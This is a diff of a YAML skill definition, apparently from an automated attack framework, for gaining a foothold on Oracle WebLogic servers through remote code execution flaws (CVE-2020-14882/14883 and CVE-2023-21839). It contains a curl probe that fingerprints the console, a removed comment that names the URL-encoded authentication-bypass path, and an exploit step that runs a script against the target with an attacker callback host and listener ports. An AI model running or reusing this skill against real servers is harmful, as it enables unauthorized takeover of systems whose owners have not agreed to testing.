@@ -1,27 +1,8 @@
-# ═══════════════════════════════════════════════════════════
-# WebLogic 多 CVE 利用 v2
-#
-# 支持:
-#   CVE-2020-14882/14883 — HTTP 认证绕过 + XML RCE（优先）
-#   CVE-2023-21839 — T3 JNDI 注入
-# ═══════════════════════════════════════════════════════════
 skill_id: weblogic_jndi_rce
 name: "WebLogic 多 CVE RCE (14882/14883/21839)"
 category: web_rce
 phase: foothold
-version: "2.0"
-
-principle: |
-  WebLogic 存在多个高危 RCE 漏洞:
-  
-  1. CVE-2020-14882/14883（优先）:
-     - 14882: /console/css/%252e%252e%252fconsole.portal 绕过认证
-     - 14883: handle 参数加载远程 XML → Spring Context → RCE
-     - 纯 HTTP，不需要 T3 协议
-  
-  2. CVE-2023-21839:
-     - T3/IIOP 协议 JNDI 注入
-     - 需要回连（LDAP/RMI）
+version: "3.0"
 
 match:
   rules:
@@ -40,18 +21,14 @@ probes:
     description: "确认 WebLogic Console + T3 协议"
     steps:
       - command: |
-          # 从 ENDPOINT 提取 base URL
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           echo "BASE_URL:$BASE"
-
           code=$(curl -s -o /dev/null -w "%{http_code}" \
             "$BASE/console/login/LoginForm.jsp" --max-time 10 2>/dev/null)
           echo "CONSOLE_STATUS:$code"
           if [ "$code" = "200" ] || [ "$code" = "302" ]; then
             echo "WEBLOGIC_CONFIRMED"
           fi
-
-          # 也检查根路径
           resp=$(curl -s "$BASE/" --max-time 10 2>/dev/null)
           if echo "$resp" | grep -qi "WebLogic\|Oracle"; then
             echo "WEBLOGIC_CONFIRMED"
@@ -71,7 +48,7 @@ exploit_paths:
         description: "CVE-2020-14883 HTTP RCE + CVE-2023-21839 T3 JNDI"
         publish_ports: [1389, 8888, 8889, 39878]
         command: |
-          python3 /opt/weblogic_exploit.py {TARGET_IP} {TARGET_PORT} \
+          python3 {skill_dir}/scripts/weblogic_exploit.py {TARGET_IP} {TARGET_PORT} \
             --lhost "$LHOST" 2>&1
         timeout: 240
         success_criteria:
